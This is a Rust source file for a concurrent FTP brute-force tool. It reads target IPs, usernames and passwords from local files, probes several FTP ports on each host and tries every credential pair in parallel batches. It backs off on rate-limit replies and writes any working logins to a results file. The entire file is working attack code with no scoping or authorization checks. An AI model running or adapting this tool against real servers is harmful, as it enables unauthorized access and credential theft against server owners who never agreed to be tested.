use anyhow::{anyhow, Result};
use suppaftp::AsyncFtpStream;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::Path,
    sync::Arc,
};
use tokio::{sync::{Semaphore, Mutex}, time::{sleep, Duration}};
use tokio::time::timeout;
use futures::stream::{FuturesUnordered, StreamExt};


// === Config ===
const MAX_PORT_SCAN_CONCURRENCY: usize = 5; // ← New: limit parallel port scans
const PORTS: &[u16] = &[21, 990, 2121, 8021, 2221];
const TIMEOUT_SECS: u64 = 2;
const GLOBAL_CONCURRENCY: usize = 15;
const STOP_ON_SUCCESS: bool = true;
const SAVE_RESULTS: bool = true;
const OUTPUT_FILE: &str = "ftp_results.txt";

// hardcoded input files
const IP_LIST_FILE: &str = "ips.txt";
const USERNAME_FILE: &str = "usernames.txt";
const PASSWORD_FILE: &str = "passwords.txt";

// === Helper Functions ===

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    Ok(reader.lines().filter_map(Result::ok).collect())
}

fn format_addr(target: &str, port: u16) -> String {
    if target.starts_with('[') && target.contains("]:") {
        target.to_string()
    } else if target.matches(':').count() == 1 && !target.contains('[') {
        target.to_string()
    } else {
        let clean = if target.starts_with('[') && target.ends_with(']') {
            &target[1..target.len() - 1]
        } else {
            target
        };
        if clean.contains(':') {
            format!("[{}]:{}", clean, port)
        } else {
            format!("{}:{}", clean, port)
        }
    }
}

async fn quick_ftp_check(addr: &str) -> Result<bool> {
    match timeout(Duration::from_secs(TIMEOUT_SECS), AsyncFtpStream::connect(addr)).await {
        Ok(Ok(mut ftp)) => {
            let _ = ftp.quit().await;
            Ok(true)
        }
        Ok(Err(_)) | Err(_) => Ok(false),
    }
}



async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
    match AsyncFtpStream::connect(addr).await {
        Ok(mut ftp) => {
            match ftp.login(user, pass).await {
                Ok(_) => {
                    let _ = ftp.quit().await;
                    Ok(true)
                }
                Err(e) => {
                    let msg = e.to_string();
                    if msg.contains("530") {
                        Ok(false)
                    } else if msg.contains("421") {
                        sleep(Duration::from_secs(1)).await;
                        Ok(false)
                    } else {
                        Err(anyhow!("FTP error: {}", msg))
                    }
                }
            }
        }
        Err(_) => Ok(false),
    }
}


// === Main Brute-force Function ===

pub async fn run(_target: &str) -> Result<()> {
    println!("=== FTP Bruteforce (Hardcoded Ports + Turbo Batch) ===");

    let users = load_lines(USERNAME_FILE)?;
    let passes = load_lines(PASSWORD_FILE)?;
    let found = Arc::new(Mutex::new(Vec::new()));
    let semaphore = Arc::new(Semaphore::new(GLOBAL_CONCURRENCY));


    let file = File::open(IP_LIST_FILE)?;
    let reader = BufReader::new(file);

    println!("[*] Starting...");

    let mut all_tasks = FuturesUnordered::new();

for line in reader.lines() {
    let ip = line?.trim().to_string(); // <-- Fix here!
    if ip.is_empty() {
        continue;
    }

        let users = users.clone();
        let passes = passes.clone();
        let found = Arc::clone(&found);
        let sem = Arc::clone(&semaphore);

        all_tasks.push(tokio::spawn(async move {
           let open_ports = {
    let mut scan_tasks = FuturesUnordered::new();
for &port in PORTS {
    let ip = ip.clone();
        let port_scan_sem = Arc::new(Semaphore::new(MAX_PORT_SCAN_CONCURRENCY));
    let port_scan_sem = Arc::clone(&port_scan_sem); // <-- Important: clone inside loop
    scan_tasks.push(tokio::spawn(async move {
        let _permit = port_scan_sem.acquire_owned().await.unwrap(); // <-- Use it here!
        let addr = format_addr(&ip, port);
        match quick_ftp_check(&addr).await {
            Ok(true) => Some(port),
            _ => None,
        }
    }));
}
    let mut ports = Vec::new();
    while let Some(res) = scan_tasks.next().await {
        if let Ok(Some(port)) = res {
            ports.push(port);
        }
    }
    ports
};



            if open_ports.is_empty() {
                println!("[-] {}: No FTP ports open.", ip);
                return;
            }

            println!("[*] {}: Open FTP ports: {:?}", ip, open_ports);

            for port in open_ports {
                let addr = format_addr(&ip, port);
                println!("[*] Brute-forcing {}", addr);

                let mut tasks = FuturesUnordered::new();
                let successes = Arc::new(Mutex::new(Vec::new()));
                let stop_flag = Arc::new(Mutex::new(false));

                let combos: Vec<(String, String)> = users.iter()
                    .flat_map(|user| passes.iter().map(move |pass| (user.clone(), pass.clone())))
                    .collect();

                for chunk in combos.chunks(10) { // <= GROUP BATCH OF 10 ATTEMPTS
                    if STOP_ON_SUCCESS && *stop_flag.lock().await {
                        break;
                    }
                    let permit = sem.clone().acquire_owned().await.unwrap();
                    let addr = addr.clone();
                    let chunk = chunk.to_vec();
                    let successes = Arc::clone(&successes);
                    let stop_flag_clone = Arc::clone(&stop_flag);

                    tasks.push(tokio::spawn(async move {
                        let _permit = permit;
                        if *stop_flag_clone.lock().await {
                            return;
                        }
                        for (user, pass) in chunk {
                            if *stop_flag_clone.lock().await {
                                break;
                            }
                            match try_ftp_login(&addr, &user, &pass).await {
                                Ok(true) => {
                                    println!("[+] {} -> {}:{}", addr, user, pass);
                                    successes.lock().await.push((addr.clone(), user.clone(), pass.clone()));
                                    *stop_flag_clone.lock().await = true;
                                    break;
                                }
                                Ok(false) => {}
                                Err(_) => {}
                            }
                        }
                    }));
                }

                while let Some(res) = tasks.next().await {
                    res.ok();
                }

                let successes_vec = successes.lock().await;
                if successes_vec.is_empty() {
                    println!("[!] {}:{}: No valid credentials.", ip, port);
                } else {
                    println!("[+] {}:{}: Found {} valid login(s).", ip, port, successes_vec.len());
                    found.lock().await.extend(successes_vec.iter().cloned());
                }
            }
        }));
    }

    while let Some(res) = all_tasks.next().await {
        res?;
    }

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n[-] No credentials found.");
    } else {
        println!("\n[+] Valid credentials found:");
        for (host, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", host, user, pass);
        }
        if SAVE_RESULTS {
            let file_path = Path::new(OUTPUT_FILE);
            let mut file = File::create(file_path)?;
            for (host, user, pass) in creds.iter() {
                writeln!(file, "{} -> {}:{}", host, user, pass)?;
            }
            println!("[+] Results saved to '{}'", file_path.display());
        }
    }

    Ok(())
}

// === Main entry point ===

#[tokio::main]
async fn main() -> Result<()> {
    run("").await
}
